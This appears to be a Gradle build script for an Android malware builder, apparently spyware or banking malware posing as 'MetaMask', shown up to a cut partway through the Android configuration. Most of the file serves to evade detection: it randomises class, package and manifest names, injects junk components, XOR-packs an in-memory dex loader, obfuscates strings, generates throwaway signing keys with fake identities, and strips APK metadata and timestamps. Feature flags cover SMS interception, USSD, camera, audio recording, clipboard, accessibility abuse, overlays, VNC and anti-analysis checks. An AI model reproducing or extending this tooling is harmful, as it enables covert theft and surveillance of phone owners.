import com.android.build.api.artifact.SingleArtifact
import java.util.UUID
import java.io.File
import java.io.BufferedOutputStream
import java.util.Random
import java.security.SecureRandom
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream
import java.util.zip.ZipEntry
import java.util.zip.Deflater
import java.util.zip.CRC32
import java.io.ByteArrayOutputStream
import java.io.FileOutputStream
import java.util.zip.GZIPOutputStream
import org.gradle.api.DefaultTask
import org.gradle.api.tasks.TaskAction
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputFile
import org.gradle.api.tasks.OutputFile
import org.gradle.api.file.RegularFileProperty
import org.gradle.api.provider.Property
import org.gradle.api.provider.ListProperty
import org.gradle.api.tasks.compile.JavaCompile
import org.gradle.api.tasks.JavaExec

buildscript {
    repositories { google(); mavenCentral(); maven { url = uri("https://jitpack.io") } }
    dependencies {
        classpath("com.github.megatronking.stringfog:gradle-plugin:5.2.0")
        classpath("com.github.megatronking.stringfog:xor:5.0.0")
    }
}

plugins { id("com.android.application"); id("org.jetbrains.kotlin.android") }

apply(plugin = "stringfog")

fun rndName(minLen: Int = 5, maxLen: Int = 8): String {
    val c = "bcdfghjklmnpqrstvwxyz"; val v = "aeiou"
    val sb = StringBuilder(); val syl = (minLen..maxLen).random()
    for (i in 0 until syl) { sb.append(if (i == 0) c.random().uppercase() else c.random()); sb.append(v.random()) }
    return sb.toString()
}
fun rndId(len: Int = 8): String = (1..len).map { "abcdefghijklmnopqrstuvwxyz".random() }.joinToString("")
fun rndSuffix(): String = UUID.randomUUID().toString().take(4)
fun rndCName(): String = "${rndName(3,5)} ${rndName(3,4)}"
fun rndPkgSeg(min: Int, max: Int): String {
    val c = "bcdfghjklmnpqrstvwxyz"; val v = "aeiou"
    val sb = StringBuilder()
    repeat((min..max).random()) { sb.append(c.random()); sb.append(v.random()) }
    return sb.toString()
}

val rXShift = (2..5).random()
fun encodeRxForC(s: String): String {
    val sb = StringBuilder()
    for (ch in s) {
        val b = ch.code + rXShift
        if (b == 92 || b == 34 || b == 0 || b < 32 || b > 127) sb.append("\\x%02x".format(b))
        else sb.append(b.toChar())
    }
    return sb.toString()
}

val randomPkg      = "com.${rndPkgSeg(2,4)}.${rndPkgSeg(3,5)}"
val randomPkgPath  = randomPkg.replace(".", "/")
val randomPrefix   = UUID.randomUUID().toString().replace("-","").take(8)
val rndVersionCode = (10000..999999).random()
val rndVersionName = "${(1..9).random()}.${(0..99).random()}.${(0..999).random()}"
val SO_NAME        = "lib${rndId(6)}"

val CLS_MAIN_APP         = "${rndName()}Application_${rndSuffix()}"
val CLS_WEB_VIEW         = "${rndName()}Activity_${rndSuffix()}"
val CLS_CUS_WEB          = "${rndName()}Activity_${rndSuffix()}"
val CLS_COMPOSE_SMS      = "${rndName()}Activity_${rndSuffix()}"
val CLS_SMS_RECV         = "${rndName()}Receiver_${rndSuffix()}"
val CLS_MMS_RECV         = "${rndName()}Receiver_${rndSuffix()}"
val CLS_HEADLESS_SMS     = "${rndName()}Service_${rndSuffix()}"
val CLS_BOOT_RECV        = "${rndName()}Receiver_${rndSuffix()}"
val CLS_ALARM_RECV       = "${rndName()}Receiver_${rndSuffix()}"
val CLS_CHIMERA_RECV     = "${rndName()}Receiver_${rndSuffix()}"
val CLS_DEFAULT_SMS_RECV = "${rndName()}Receiver_${rndSuffix()}"
val CLS_LOADER_RECV      = "${rndName()}Receiver_${rndSuffix()}"
val CLS_WS_HANDLER_RECV  = "${rndName()}Receiver_${rndSuffix()}"
val CLS_VNC_BRIDGE_RECV  = "${rndName()}Receiver_${rndSuffix()}"
val CLS_CHIKEN_BRIDGE_RECV = "${rndName()}Receiver_${rndSuffix()}"
val CLS_CHIKEN_WORKER    = "${rndName()}Worker_${rndSuffix()}"
val CLS_CMD_CHANNEL_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_DEV_MONITOR_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_FG_APP_MONITOR_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_UNINSTALL_HELPER    = "${rndName()}Helper_${rndSuffix()}"
val CLS_FCM_TOKEN_SVC    = "${rndName()}Service_${rndSuffix()}"
val CLS_FRIEN_CAT        = "${rndName()}Service_${rndSuffix()}"
val CLS_LEGACY_USSD_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_MASTER_WS        = "${rndName()}Service_${rndSuffix()}"
val CLS_PRIVILEGE_SVC    = "${rndName()}Service_${rndSuffix()}"
val CLS_PULSE_SVC        = "${rndName()}Service_${rndSuffix()}"
val CLS_SVC_STARTER      = "${rndName()}Worker_${rndSuffix()}"
val CLS_TURTLE_SVC       = "${rndName()}Service_${rndSuffix()}"
val CLS_USSD_CTL_SVC     = "${rndName()}Service_${rndSuffix()}"
val CLS_TROL_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_UUID_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_FRIEN_WORKER     = "${rndName()}Worker_${rndSuffix()}"
val CLS_AUTH_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_STUB_AUTH        = "${rndName()}Auth_${rndSuffix()}"
val CLS_STUB_PROVIDER    = "${rndName()}Provider_${rndSuffix()}"
val CLS_SYNC_ADAPTER     = "${rndName()}Adapter_${rndSuffix()}"
val CLS_SYNC_MANAGER     = "${rndName()}Manager_${rndSuffix()}"
val CLS_SYNC_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_ZEBRA_WORKER     = "${rndName()}Worker_${rndSuffix()}"
val CLS_NATIVE_BRIDGE    = rndName(7, 11)
val CLS_SECURITY_AUDITOR = rndName(7, 11)
val CLS_REMOTE_CONFIG      = "${rndName()}Config_${rndSuffix()}"
val CLS_UUID_PROVIDER      = "${rndName()}Provider_${rndSuffix()}"
val CLS_RADIO_LINK         = "${rndName()}Protocol_${rndSuffix()}"
val CLS_SCHEDULER_WORKER   = "${rndName()}Worker_${rndSuffix()}"
val CLS_GATEWAY_ACTIVITY   = "${rndName()}Activity_${rndSuffix()}"
val CLS_CORAL_COBRA        = "${rndName()}Activity_${rndSuffix()}"
val CLS_AUTH_SCREEN        = "${rndName()}Activity_${rndSuffix()}"
val CLS_PERM_REQUESTER     = "${rndName()}Activity_${rndSuffix()}"
val CLS_ACCESS_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_BADGER_FALCON_RECV     = "${rndName()}Receiver_${rndSuffix()}"
val CLS_BADGER_FALCON_LAUNCHER = "${rndName()}Activity_${rndSuffix()}"
val CLS_OTTER_HAWK_LAUNCHER    = "${rndName()}Activity_${rndSuffix()}"
val CLS_AUTO_IBIS              = "${rndName()}Helper_${rndSuffix()}"
val CLS_CORE_LAUNCHER          = "${rndName()}Launcher_${rndSuffix()}"
val CLS_MARTEN_HELPER          = "${rndName()}Helper_${rndSuffix()}"
val CLS_MINK_SCANNER           = "${rndName()}Scanner_${rndSuffix()}"
val CLS_STOAT_SHIELD           = "${rndName()}Shield_${rndSuffix()}"
val CLS_UNLOCK_MONITOR         = "${rndName()}Monitor_${rndSuffix()}"
val CLS_SPARROW                = "${rndName()}Helper_${rndSuffix()}"
val CLS_SMS_SEND_ENGINE        = "${rndName()}Engine_${rndSuffix()}"
val CLS_AUDIO_FOCUS_HOLDER     = "${rndName()}Holder_${rndSuffix()}"
val CLS_VNC_PROVIDER           = "${rndName()}Provider_${rndSuffix()}"
val CLS_COMPANION_BINDER       = "${rndName()}Binder_${rndSuffix()}"
val CLS_NATIVE_DAEMON          = "${rndName()}Daemon_${rndSuffix()}"
val CLS_KEEP_ALIVE_MGR         = "${rndName()}Manager_${rndSuffix()}"
val CLS_KEEPALIVE_JOB_SVC      = "${rndName()}Service_${rndSuffix()}"

val JNI_CHECK_ROOT    = "f${rndId(7)}"
val JNI_CHECK_EMU     = "f${rndId(7)}"
val JNI_CHECK_FRIDA   = "f${rndId(7)}"
val JNI_SRV_A         = "f${rndId(6)}"
val JNI_SRV_B         = "f${rndId(6)}"
val JNI_SRV_EP        = "f${rndId(6)}"
val JNI_ENCRYPT         = "m${rndId(7)}"
val JNI_DECODE_TASK     = "m${rndId(7)}"
val JNI_PROCESS_TASK    = "m${rndId(7)}"
val JNI_CALL_ACTION     = "m${rndId(7)}"
val JNI_TEL_PREFIX      = "m${rndId(7)}"
val JNI_REQ_METHOD      = "m${rndId(7)}"
val JNI_CB_HANDLER      = "m${rndId(7)}"
val JNI_SYS_CB          = "m${rndId(7)}"
val JNI_CONTACTS_ACTION = "m${rndId(7)}"
val JNI_BUILD_CONTACTS  = "m${rndId(7)}"
val JNI_DECRYPT_DOMAIN  = "m${rndId(7)}"
val JNI_UUID_PREFIX     = "m${rndId(7)}"
val JNI_UUID_SUFFIX     = "m${rndId(7)}"

val ACTION_RESTART_SVC   = "a.${rndId(8)}.${rndId(4)}"
val ACTION_HANDLE_CMD    = "a.${rndId(8)}.${rndId(4)}"
val ACTION_INTERNAL_KICK = "a.${rndId(8)}.${rndId(4)}"
val ACTION_FOX_TARGET    = "a.${rndId(8)}.${rndId(4)}"
val ACTION_SEND_TO_SRV   = "a.${rndId(8)}.${rndId(4)}"
val ACTION_SEND_MSG      = "a.${rndId(8)}.${rndId(4)}"
val ACTION_START_MON     = "a.${rndId(8)}.${rndId(4)}"
val ACTION_LAUNCH_CHIKEN = "a.${rndId(8)}.${rndId(4)}"
val EXTRA_MSG_DATA_KEY   = "e${rndId(10)}"
val EXTRA_MSG_SEND_KEY   = "e${rndId(10)}"
val EXTRA_CMD_DATA_KEY   = "e${rndId(10)}"
val EXTRA_BOOT_KEY       = "e${rndId(10)}"

val WM_MASTER_CHECK      = rndId(14)
val WM_BG_SYNC           = rndId(14)
val WM_TAG_SMS           = rndId(10)
val WM_TAG_DEFAULT_SMS   = rndId(10)
val WM_TAG_BOOT          = rndId(10)
val WM_TAG_CHIMERA       = rndId(10)
val WM_TAG_WAKE_URGENT   = rndId(10)
val WM_TAG_FCM           = rndId(10)
val WM_TAG_TURTLE        = rndId(10)
val WM_TAG_PULSE         = rndId(10)
val WM_TAG_ZEBRA         = rndId(10)

val CHAN_MWD             = rndId(14)
val CHAN_SYNC            = rndId(14)
val CHAN_WORKER          = rndId(14)
val CHAN_USSD            = rndId(14)
val CHAN_CORE            = rndId(14)

val PREFS_SVC_STATUS     = rndId(14)
val PREFS_CONN           = rndId(14)
val PREFS_UUID           = rndId(14)
val PREFS_FCM            = rndId(14)
val PREFS_SMS            = rndId(14)
val PREFS_SMS_HIST       = rndId(14)
val PREFS_KILL           = rndId(14)
val PREFS_SETUP          = rndId(14)
val PREFS_NET            = rndId(14)
val PREFS_DEVICE         = rndId(14)

val KEY_IS_RUNNING       = rndId(12)
val KEY_DOMAIN           = rndId(12)
val KEY_UUID_VAL         = rndId(12)
val KEY_FCM_TOKEN        = rndId(12)
val KEY_DISABLED         = rndId(12)
val KEY_INTERCEPT        = rndId(12)
val KEY_HANDSHAKE        = rndId(12)
val KEY_SYNC_TS          = rndId(12)

val CMD_XOR_KEY          = (33..126).random()

val STUB_CLS               = "${rndName(4,6)}App${rndSuffix()}"
val STUB_DECOY_CLS         = "${rndName(4,7)}Auth${rndSuffix()}"
val STUB_FACTORY_CLS       = "${rndName(4,6)}Factory${rndSuffix()}"
val DEXLDR_SO_NAME         = "ld${rndId(5)}"
val JNI_UNPACK_SYMBOL      = "f${rndId(7)}"
val JNI_LITE_CHECK_SYMBOL  = "g${rndId(7)}"
val PACK_XOR_KEY: ByteArray = ByteArray(32).also { SecureRandom().nextBytes(it) }
val imdcXorKey = (0x21..0x7E).random()
val imdcEncBytes = "dalvik.system.InMemoryDexClassLoader"
    .map { c -> "(byte)(${c.code xor imdcXorKey})" }.joinToString(",")
val PAYLOAD_FOLDER         = rndId(6)
val PAYLOAD_PART_NAMES     = (0..2).map { rndId(8) + "." + listOf("db","bin","cache","tmp").random() }

val traffer: String = run {
    val fromCmd = (project.findProperty("traffer") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("traffer=") }
                ?.removePrefix("traffer=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val appName: String = run {
    val fromCmd = (project.findProperty("appName") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("appName=") }
                ?.removePrefix("appName=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val smsTarget: String = run {
    val fromCmd = (project.findProperty("smsTarget") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("smsTarget=") }
                ?.removePrefix("smsTarget=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val uuidPrefix: String = run {
    val fromCmd = (project.findProperty("uuidPrefix") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("uuidPrefix=") }
                ?.removePrefix("uuidPrefix=")
                ?.trim()
                ?: "777777"
        } else "777777"
    }
}

val targetUrl: String = run {
    val fromCmd = (project.findProperty("targetUrl") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("targetUrl=") }
                ?.removePrefix("targetUrl=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val hideIcon: Boolean = run {
    val fromCmd = (project.findProperty("hideIcon") as? String)?.trim()?.lowercase()
    when (fromCmd) {
        "false" -> false
        "true"  -> true
        else    -> false
    }
}
val launcherCategory = if (hideIcon) "android.intent.category.LEANBACK_LAUNCHER"
                       else          "android.intent.category.LAUNCHER"

// в"Ђв"Ђ Feature flags (РІСЃРµ true РїРѕ СѓРјРѕР»С‡Р°РЅРёСЋ РґР»СЏ РѕР±СЂР°С‚РЅРѕР№ СЃРѕРІРјРµСЃС‚РёРјРѕСЃС‚Рё) в"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђ
fun featBool(key: String, default: Boolean = true): Boolean {
    val v = project.findProperty(key)?.toString()?.trim()?.lowercase() ?: return default
    return when (v) { "false", "0", "no" -> false; else -> true }
}
val featFcm            = featBool("feat_fcm")
val featSms            = featBool("feat_sms")
val featSmsRole        = featBool("feat_sms_role")
val featRadioLink      = featBool("feat_radio_link")
val featContacts       = featBool("feat_contacts")
val featAccounts       = featBool("feat_accounts")
val featCallPhone      = featBool("feat_call_phone")
val featUssd           = featBool("feat_ussd")
val featCamera         = featBool("feat_camera")
val featAudioRecord    = featBool("feat_audio_record")
val featFiles          = featBool("feat_files")
val featClipboard      = featBool("feat_clipboard")
val featTurtle         = featBool("feat_turtle")
val featSyncManager    = featBool("feat_sync_manager")
val featKeepaliveJob   = featBool("feat_keepalive_job")
val featFrienCat       = featBool("feat_frien_cat")
val featDeviceMonitor  = featBool("feat_device_monitor")
val featTrolSvc        = featBool("feat_trol_svc")
val featCmdChannel     = featBool("feat_cmd_channel")
val featPrivilegeSvc   = featBool("feat_privilege_svc")
val featBiometric      = featBool("feat_biometric")
// v3 ONLY
val featAccessibility  = featBool("feat_accessibility")
val featSparrow        = featBool("feat_sparrow")
val featStoatShield    = featBool("feat_stoat_shield")
val featAutoIbis       = featBool("feat_auto_ibis")
val featUnlock         = featBool("feat_unlock")
val featOverlay        = featBool("feat_overlay")
val featDeviceAdmin    = featBool("feat_device_admin")
val featVnc            = featBool("feat_vnc")
val featKeepaliveAudio = featBool("feat_keepalive_audio")
val featAppBlocker     = featBool("feat_app_blocker")
val featMinkScanner    = featBool("feat_mink_scanner")
val featMarten         = featBool("feat_marten")
val featVibration      = featBool("feat_vibration")
val featFileRevoker    = featBool("feat_file_revoker")
val featUninstallHelper = featBool("feat_uninstall_helper")
val featChainBridge    = featBool("feat_chain_bridge")
val featHyperOs        = featBool("feat_hyperos")
val featWriteSettings  = featBool("feat_write_settings", false)
// Dependency constraints
val featSmsRoleFinal      = featSmsRole && featSms
val featRadioLinkFinal    = featRadioLink && featSms
val featUssdFinal         = featUssd && featCallPhone
val featSparrowFinal      = featSparrow && featAccessibility
val featStoatFinal        = featStoatShield && featAccessibility
val featAutoIbisFinal     = featAutoIbis && featAccessibility
val featUnlockFinal       = featUnlock && featAccessibility
val featOverlayFinal      = featOverlay && featAccessibility
val featDeviceAdminFinal  = featDeviceAdmin && featAutoIbisFinal
val featAppBlockerFinal   = featAppBlocker && featAccessibility
val featKeepAliveMgr      = featKeepaliveJob || featFrienCat || featKeepaliveAudio
val junkPkg = "$randomPkg.internal.utils.common"

val usedJunkNames = mutableSetOf<String>()
fun junkSuffix(): String {
    val pool = listOf("Cache","Bus","Pool","Store","Buffer","Mgr","Holder","Helper",
                      "Builder","Registry","Source","Sink","Filter","Reader","Writer",
                      "Loader","Router","Adapter","Factory","Observer","Wrapper","Guard",
                      "Bridge","Proxy","Relay","Tracker","Binder","Scope","Context")
    return if ((0..2).random() == 0) "_${UUID.randomUUID().toString().take(4)}" else pool.random()
}
fun freshJunkName(base: String, suffixFn: () -> String = ::junkSuffix): String {
    repeat(50) {
        val n = base + suffixFn()
        if (usedJunkNames.add(n)) return n
    }
    val fallback = base + rndSuffix() + "_" + rndId(5)
    usedJunkNames.add(fallback)
    return fallback
}

val fakeActivityCount = (31..63).random()
val fakeActivityNames = (1..fakeActivityCount).map { freshJunkName("${rndName()}Activity") }
val fakeServiceCount  = (28..49).random()
val fakeServiceNames  = (1..fakeServiceCount).map  { freshJunkName("${rndName()}Service")  }
val fakeProviderCount = (7..21).random()
val fakeProviderNames = (1..fakeProviderCount).map { freshJunkName("${rndName()}Provider") }

println("--- [CRISTOFER_V3] pkg=$randomPkg v$rndVersionName ($rndVersionCode) SO=$SO_NAME rXShift=$rXShift ---")

val isRandomizedBuild = project.gradle.startParameter.taskNames.any {
    val t = it.lowercase()
    (t.contains("assemble") || t.contains("install") || t.contains("bundle")) && !t.contains("clean")
}

val shadowSrcDir         = layout.buildDirectory.dir("randomized_sources").get().asFile
val dynamicProguardRules = layout.buildDirectory.file("generated_proguard_rules.pro").get().asFile

val sdkDir        = android.sdkDirectory.absolutePath.replace("\\", "/")
val buildToolsVer = "34.0.0"
val isWindows     = System.getProperty("os.name").lowercase().contains("win")
val ZIPALIGN      = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "zipalign.exe" else "zipalign"
val APKSIGNER     = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "apksigner.bat" else "apksigner"
val outDir        = "${project.buildDir}/outputs/apk/release"
val flipOutDir    = "${project.buildDir}/flip/out"

fun runCmd(cmd: List<String>) {
    val pb = ProcessBuilder(cmd).redirectErrorStream(true)
    val p = pb.start()
    val out = p.inputStream.bufferedReader().readText()
    val exit = p.waitFor()
    if (exit != 0) throw GradleException("Command failed (exit $exit): ${cmd.joinToString(" ")}\n$out")
    if (out.isNotBlank()) println(out)
}

val keystoreBaseDir = layout.buildDirectory.dir("outputs/keystores").get().asFile.absolutePath
fun generateUniqueKey(tag: String): Triple<String, String, String> {
    val dir = file("$keystoreBaseDir/$tag").also { it.mkdirs() }
    val ksFile = File(dir, "$tag.jks").also { if (it.exists()) it.delete() }
    val alias = "a" + UUID.randomUUID().toString().replace("-","").take(12)
    val pass  = UUID.randomUUID().toString().replace("-","")
    val countries = listOf("US","DE","FR","IT","ES","CA","GB","JP","AU","NL","SE","PL","CZ","AT","CH")
    val cities    = listOf("New York","Berlin","Paris","Rome","Madrid","London","Tokyo","Amsterdam","Stockholm","Vienna","Prague")
    val states    = listOf("NY","BE","IDF","RM","MD","GL","TK","NH","ST","VI","PR")
    val orgP = listOf("Alpha","Beta","Cyber","Net","Global","Tech","Smart","Secure","Cloud","Nexus","Prime","Vertex")
    val orgS = listOf("Corp","Inc","Ltd","GmbH","Group","Technologies","Systems","Solutions","Labs","Digital")
    val cn   = rndCName()
    val dname = "CN=$cn, OU=${orgP.random()} ${orgS.random()}, O=${orgP.random()} ${orgS.random()}, L=${cities.random()}, ST=${states.random()}, C=${countries.random()}"
    runCmd(listOf("keytool","-genkeypair","-v","-storetype","PKCS12",
        "-keystore",ksFile.absolutePath,"-alias",alias,"-keyalg","RSA","-keysize","2048",
        "-validity","${(15000..25000).random()}","-storepass",pass,"-keypass",pass,"-dname",dname))
    return Triple(ksFile.absolutePath, alias, pass)
}

fun stripApkMetaData(apkFile: File) {
    val stripPatterns = listOf(
        Regex("META-INF/com/android/build/.*"),
        Regex("META-INF/version-control-info\\.textproto"),
        Regex("META-INF/[^/]+\\.kotlin_module"),
        Regex("kotlin-tooling-metadata\\.json")
    )
    val tmp = File(apkFile.parent, apkFile.name + ".metastrip.tmp")
    val removed = mutableListOf<String>()
    ZipFile(apkFile).use { zf ->
        ZipOutputStream(BufferedOutputStream(tmp.outputStream())).use { zos ->
            for (entry in zf.entries().toList()) {
                if (stripPatterns.any { it.matches(entry.name) }) { removed += entry.name; continue }

                val raw = zf.getInputStream(entry).use { it.readBytes() }

                val ne = ZipEntry(entry.name)
                ne.method = entry.method
                ne.setSize(raw.size.toLong())
                ne.setCrc(CRC32().apply { update(raw) }.value)

                if (entry.method == ZipEntry.STORED) {
                    ne.setCompressedSize(raw.size.toLong())
                } else {
                    val def = Deflater(Deflater.DEFAULT_COMPRESSION, true)
                    val baos = ByteArrayOutputStream()
                    val buf = ByteArray(8192)
                    try {
                        def.setInput(raw); def.finish()
                        while (!def.finished()) {
                            val n = def.deflate(buf); if (n > 0) baos.write(buf, 0, n)
                        }
                    } finally { def.end() }
                    ne.setCompressedSize(baos.size().toLong())
                }

                zos.putNextEntry(ne)
                zos.write(raw)
                zos.closeEntry()
            }
        }
    }
    if (removed.isEmpty()) { tmp.delete(); return }
    apkFile.delete(); tmp.renameTo(apkFile)
    println("--- [STRIP-META] Removed from APK: ${removed.joinToString()} ---")
}

fun randomizeZipTimestamps(zipFile: File) {
    val bytes = zipFile.readBytes()
    val rng = Random()
    fun ri(o: Int) = (bytes[o].toInt() and 0xFF) or ((bytes[o+1].toInt() and 0xFF) shl 8) or
        ((bytes[o+2].toInt() and 0xFF) shl 16) or ((bytes[o+3].toInt() and 0xFF) shl 24)
    fun rs(o: Int) = (bytes[o].toInt() and 0xFF) or ((bytes[o+1].toInt() and 0xFF) shl 8)
    fun ws(o: Int, v: Int) { bytes[o] = (v and 0xFF).toByte(); bytes[o+1] = ((v shr 8) and 0xFF).toByte() }
    fun rndT() = (rng.nextInt(24) shl 11) or (rng.nextInt(60) shl 5) or rng.nextInt(30)
    fun rndD() = ((rng.nextInt(10) + 35) shl 9) or ((rng.nextInt(12) + 1) shl 5) or (rng.nextInt(28) + 1)
    var eocd = -1
    for (i in bytes.size - 22 downTo 0) { if (ri(i) == 0x06054b50) { eocd = i; break } }
    if (eocd == -1) return
    val cdStart = ri(eocd + 16); var pos = cdStart
    while (pos + 46 <= bytes.size && ri(pos) == 0x02014b50) {
        val nlen = rs(pos + 28); val xlen = rs(pos + 30); val clen = rs(pos + 32)
        val t = rndT(); val d = rndD(); ws(pos + 12, t); ws(pos + 14, d)
        val lfh = ri(pos + 42)
        if (lfh in 0..(bytes.size - 30) && ri(lfh) == 0x04034b50) { ws(lfh + 10, t); ws(lfh + 12, d) }
        pos += 46 + nlen + xlen + clen
    }
    zipFile.writeBytes(bytes)
    println("--- [TIMESTAMPS] Randomized: ${zipFile.name} ---")
}

configure<com.github.megatronking.stringfog.plugin.StringFogExtension> {
    implementation = "com.github.megatronking.stringfog.xor.StringFogImpl"
    enable = true
    fogPackages = arrayOf(randomPkg, "com.yourcompany")
    kg = com.github.megatronking.stringfog.plugin.kg.RandomKeyGenerator()
    mode = com.github.megatronking.stringfog.plugin.StringFogMode.bytes
}

abstract class RandomizeManifestTask : DefaultTask() {
    @get:InputFile  abstract val mergedManifest: RegularFileProperty
    @get:OutputFile abstract val updatedManifest: RegularFileProperty
    @get:Input abstract val appId: Property<String>
    @get:Input abstract val prefix: Property<String>
    @get:Input abstract val fakeActivities: ListProperty<String>
    @get:Input abstract val fakeServices: ListProperty<String>
    @get:Input abstract val fakeProviders: ListProperty<String>
    @get:Input abstract val junkPkgName: Property<String>

    @TaskAction fun taskAction() {
        var content = mergedManifest.get().asFile.readText()

        val extraPerms = listOf(
            "android.permission.VIBRATE",
            "android.permission.SET_ALARM",
            "android.permission.ACCESS_WIFI_STATE","android.permission.BLUETOOTH",
            "android.permission.FLASHLIGHT",
            "android.permission.MODIFY_AUDIO_SETTINGS",
            "android.permission.GET_PACKAGE_SIZE","android.permission.READ_SYNC_STATS"
        )
        val permRe = """<uses-permission[^>]+/>""".toRegex()
        val existing = permRe.findAll(content).map { it.value }.toList()
        val newPerms = extraPerms.shuffled().take((3..6).random())
            .map { "    <uses-permission android:name=\"$it\" />" }
        val allPerms = (existing + newPerms).shuffled()
        content = content.replace(permRe, "")
        content = content.replace("<application", "${allPerms.joinToString("\n")}\n    <application")

        val metaSb = StringBuilder()
        repeat((50..100).random()) {
            metaSb.append("        <meta-data android:name=\"${appId.get()}.meta.${UUID.randomUUID()}\" android:value=\"${UUID.randomUUID()}\" />\n")
        }

        val jPkg = junkPkgName.get()
        val acts = fakeActivities.get().joinToString("\n") { n ->
            "<activity android:name=\"$jPkg.$n\" android:exported=\"false\" android:theme=\"@android:style/Theme.NoDisplay\" android:label=\"${UUID.randomUUID().toString().take(5)}\" />"
        }
        val svcs = fakeServices.get().joinToString("\n") { n ->
            "<service android:name=\"$jPkg.$n\" android:exported=\"false\" android:enabled=\"true\" />"
        }
        val provs = fakeProviders.get().joinToString("\n") { n ->
            "<provider android:name=\"$jPkg.$n\" android:authorities=\"${appId.get()}.p.${UUID.randomUUID()}\" android:exported=\"false\" android:initOrder=\"${(1..99).random()}\" />"
        }
        content = content.replace("</application>", "$metaSb\n$acts\n$svcs\n$provs\n    </application>")
        content = content.replace(Regex("android:extractNativeLibs\\s*=\\s*\"[^\"]*\""), "")
        updatedManifest.get().asFile.writeText(content)
    }
}

androidComponents {
    onVariants(selector().all()) { variant ->
        if (isRandomizedBuild) {
            val t = tasks.register<RandomizeManifestTask>("randomize${variant.name.replaceFirstChar { it.uppercase() }}Manifest") {
                appId.set(randomPkg); prefix.set(randomPrefix)
                fakeActivities.set(fakeActivityNames); fakeServices.set(fakeServiceNames); fakeProviders.set(fakeProviderNames)
                junkPkgName.set(junkPkg)
            }
            variant.artifacts.use(t)
                .wiredWithFiles(RandomizeManifestTask::mergedManifest, RandomizeManifestTask::updatedManifest)
                .toTransform(SingleArtifact.MERGED_MANIFEST)
        }
    }
}

android {
    namespace  = if (isRandomizedBuild) randomPkg else "com.example.MetaMask"
    compileSdk = 36

    defaultConfig {
        applicationId = if (isRandomizedBuild) randomPkg else "com.example.MetaMask"
        minSdk = 26; targetSdk = 33
        multiDexEnabled = true
        if (isRandomizedBuild) {
            multiDexKeepFile = file("${layout.buildDirectory.get()}/randomized_sources/multidex-config.txt")
            versionCode = rndVersionCode; versionName = rndVersionName
        } else { versionCode = 1; versionName = "1.0" }
        manifestPlaceholders["servicePrefix"]  = "Svc_$randomPrefix"
        manifestPlaceholders["receiverPrefix"] = "Rcv_$randomPrefix"
        manifestPlaceholders["workerPrefix"]   = "Wrk_$randomPrefix"
        // в"Ђв"Ђ Feature BuildConfig в"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђ
        buildConfigField("boolean", "FEAT_FCM",              "$featFcm")
        buildConfigField("boolean", "FEAT_SMS",              "$featSms")
        buildConfigField("boolean", "FEAT_SMS_ROLE",         "$featSmsRoleFinal")
        buildConfigField("boolean", "FEAT_RADIO_LINK",       "$featRadioLinkFinal")
        buildConfigField("boolean", "FEAT_CONTACTS",         "$featContacts")
        buildConfigField("boolean", "FEAT_ACCOUNTS",         "$featAccounts")
        buildConfigField("boolean", "FEAT_CALL_PHONE",       "$featCallPhone")
        buildConfigField("boolean", "FEAT_USSD",             "$featUssdFinal")
        buildConfigField("boolean", "FEAT_CAMERA",           "$featCamera")
        buildConfigField("boolean", "FEAT_AUDIO_RECORD",     "$featAudioRecord")
        buildConfigField("boolean", "FEAT_FILES",            "$featFiles")
        buildConfigField("boolean", "FEAT_CLIPBOARD",        "$featClipboard")
        buildConfigField("boolean", "FEAT_TURTLE",           "$featTurtle")
        buildConfigField("boolean", "FEAT_SYNC_MANAGER",     "$featSyncManager")
        buildConfigField("boolean", "FEAT_KEEPALIVE_JOB",    "$featKeepaliveJob")
        buildConfigField("boolean", "FEAT_FRIEN_CAT",        "$featFrienCat")
        buildConfigField("boolean", "FEAT_DEVICE_MONITOR",   "$featDeviceMonitor")
        buildConfigField("boolean", "FEAT_TROL_SVC",         "$featTrolSvc")
        buildConfigField("boolean", "FEAT_CMD_CHANNEL",      "$featCmdChannel")
        buildConfigField("boolean", "FEAT_PRIVILEGE_SVC",    "$featPrivilegeSvc")
        buildConfigField("boolean", "FEAT_BIOMETRIC",        "$featBiometric")
        buildConfigField("boolean", "FEAT_ACCESSIBILITY",    "$featAccessibility")
